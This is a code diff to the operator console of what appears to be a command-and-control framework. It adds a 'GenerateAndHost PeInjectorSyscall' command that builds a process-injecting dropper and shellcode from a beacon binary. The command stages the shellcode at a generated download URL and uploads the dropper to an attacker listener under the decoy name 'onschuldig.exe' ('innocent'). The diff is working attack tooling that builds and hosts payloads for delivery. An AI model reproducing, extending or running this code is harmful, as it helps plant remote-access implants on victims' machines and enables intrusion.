@@ -17,6 +17,11 @@ import GeneratePowershellLauncher
 sys.path.insert(1, './PeDropper/')
 import GenerateDropperBinary
 
+if os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
+    sys.path.insert(1, './PeInjectorSyscall/')
+    import GenerateInjector
+
+
 
 class Terminal(QWidget):
     tabPressed = pyqtSignal()
@@ -25,6 +30,7 @@ class Terminal(QWidget):
     def __init__(self, parent, ip, port, devMode):
         super(QWidget, self).__init__(parent)
         self.layout = QVBoxLayout(self)
+        self.layout.setContentsMargins(0, 0, 0, 0)
 
         self.grpcClient = GrpcClient(ip, port, devMode)
 
@@ -38,11 +44,6 @@ class Terminal(QWidget):
         self.commandEditor = CommandEditor()
         self.layout.addWidget(self.commandEditor, 2)
         self.commandEditor.returnPressed.connect(self.runCommand)
-
-
-    def __del__(self):
-        self.thread.quit()
-        self.thread.wait()
 
     def nextCompletion(self):
         index = self._compl.currentIndex()
@@ -297,7 +298,8 @@ exemple:
             helpMsg = """GenerateAndHost:
 GenerateAndHost generate a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
 exemple:
-- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""
+- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
+- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""
 
             line = '\n' + helpMsg  + '\n';
             self.editorOutput.insertPlainText(line)
@@ -329,6 +331,32 @@ exemple:
                 listenerDownload = listenerBeacon
 
             self.GenerateAndHostPowershellWebDelivery(commandLine, listenerDownload, listenerBeacon)
+
+        if mode == "PeInjectorSyscall":
+            if len(instructions) < 4:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                helpMsg = """GenerateAndHost PeInjectorSyscall:
+Generate a ....
+exemple:
+- GenerateAndHost PeInjectorSyscall processToInject listenerHash
+- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""
+
+                line = '\n' + helpMsg  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return;
+            
+            # should take 2 listeners: 
+            #   the http/https listener to download the payload from
+            #   one listner for the beacon to connect to
+            processToInject = instructions[2]
+            listenerBeacon = instructions[3]
+            if  len(instructions) >= 5:
+                listenerDownload = instructions[4]
+            else:
+                listenerDownload = listenerBeacon
+
+            self.GenerateAndHostPeInjectorSyscall(commandLine, listenerDownload, listenerBeacon, processToInject)
     
         else:
             line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
@@ -460,6 +488,147 @@ exemple:
         self.editorOutput.insertPlainText(line)
 
 
+    # Implementation de GenerateAndHost PeInjectorSyscall
+    def GenerateAndHostPeInjectorSyscall(self, commandLine,  listenerDownload, listenerBeacon, processToInject):
+        commandTeamServer = "infoListener "+listenerDownload
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return        
+
+        results = result.split("\n")
+        if len(results)<4:
+            return
+
+        schemeDownload = results[0]
+        ipDownload = results[1]
+        portDownload = results[2]
+        downloadPath = results[3]
+        if not downloadPath:
+            error = "Error: Download listener must be of type http or https."
+            self.editorOutput.insertPlainText(error)
+            return
+
+        if downloadPath[0]=="/":
+            downloadPath = downloadPath[1:]
+
+        if  listenerBeacon != listenerDownload:
+            commandTeamServer = "infoListener "+listenerBeacon
+            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
+
+            result = resultTermCommand.result
+            if "Error" in result:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                line = '\n' + result  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return   
+
+            results = result.split("\n")
+            if len(results)<4:
+                return
+
+            scheme = results[0]
+            ip = results[1]
+            port = results[2]
+        else:
+            scheme=schemeDownload
+            ip=ipDownload
+            port=portDownload
+
+        commandTeamServer = "getBeaconBinary "+listenerBeacon
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return   
+
+        print("Beacon size", len(resultTermCommand.data))
+        beaconFilePath = "./BeaconHttp.exe"
+        beaconFile = open(beaconFilePath, "wb")
+        beaconFile.write(resultTermCommand.data)
+
+        beaconArg = ip+" "+port
+        if scheme=="http" or scheme=="https":
+            beaconArg = beaconArg+" "+scheme
+
+        # Generate the 2 files
+        process = processToInject
+        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
+        urlStage =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
+
+        if not os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + "PeInjectorSyscall module not found"  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+
+        dropperExePath, shellcodePath = GenerateInjector.generatePayloads(beaconFilePath, beaconArg, "", process, urlStage)
+
+        # Upload the file and get the path
+        try:
+            with open(dropperExePath, mode='rb') as fileDesc:
+                payload = fileDesc.read()
+        except IOError:
+            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + "Error: File does not appear to exist." + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+
+        commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+"onschuldig.exe"
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+                
+        try:
+            with open(shellcodePath, mode='rb') as fileDesc:
+                payload = fileDesc.read()
+        except IOError:
+            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + "Error: File does not appear to exist." + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+
+        commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+filename
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+                
+        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + "onschuldig.exe"
+        line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+        self.editorOutput.appendHtml(line)
+        line = '\n' + result  + '\n';
+        self.editorOutput.insertPlainText(line)
+
     def setCursorEditorAtEnd(self):
         cursor = self.editorOutput.textCursor()
         cursor.movePosition(QTextCursor.End,)
@@ -543,6 +712,7 @@ completerData = [
              ]),
     ('GenerateAndHost',[
             ('PowershellWebDelivery',[]),
+            ('PeInjectorSyscall',[]),
              ]),
 ]
 
